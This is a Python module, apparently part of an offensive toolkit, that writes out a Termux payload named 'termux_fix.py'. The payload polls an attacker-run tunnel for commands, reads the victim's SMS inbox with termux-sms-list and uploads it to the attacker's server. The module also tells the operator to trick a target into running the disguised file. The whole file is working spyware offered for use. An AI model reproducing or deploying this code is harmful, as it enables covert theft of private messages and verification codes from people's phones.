import os
from base_module import BaseModule

class SmsReader(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Generate a Termux SMS Reader stub (HTTP/HTTPS)"
        self.options = {
            "LHOST": {"value": "https://your-tunnel.trycloudflare.com", "required": True, "desc": "Cloudflared/Tunnel URL"},
            "FILENAME": {"value": "termux_fix.py", "required": True, "desc": "Output filename"}
        }

    def run(self):
        lhost = self.options["LHOST"]["value"]
        filename = self.options["FILENAME"]["value"]
        
        # Stub yang akan dijalankan di Termux target
        stub_code = f"""
import requests
import time
import subprocess
import os

URL = "{lhost}"

def execute_cmd(cmd):
    if cmd == "halo":
        return "halo anda berhasil konek"
    elif cmd == "readsms":
        try:
            # Menjalankan termux-sms-list dan menyimpan ke SMS.txt
            result = subprocess.check_output(["termux-sms-list"], stderr=subprocess.STDOUT)
            with open("SMS.txt", "w") as f:
                f.write(result.decode())
            
            # Kirim file ke hacker
            with open("SMS.txt", "rb") as f:
                requests.post(f"{{URL}}/upload", files={{"file": f}})
            return "[+] SMS.txt has been sent to hacker."
        except Exception as e:
            return f"[-] Error: {{str(e)}}. Make sure Termux:API is installed."
    return "[-] Unknown command"

print("[*] Service Started...")
while True:
    try:
        # Polling command dari server
        r = requests.get(f"{{URL}}/get_cmd")
        if r.status_code == 200:
            command = r.text.strip()
            if command and command != "wait":
                output = execute_cmd(command)
                requests.post(f"{{URL}}/response", data={{"output": output}})
        time.sleep(2)
    except:
        time.sleep(5)
"""
        with open(filename, "w") as f:
            f.write(stub_code)
        
        print(f"\n\033[1;32m[+] Payload generated: {filename}\033[0m")
        print(f"[*] Send this file to target and ask them to run: python {filename}\n")
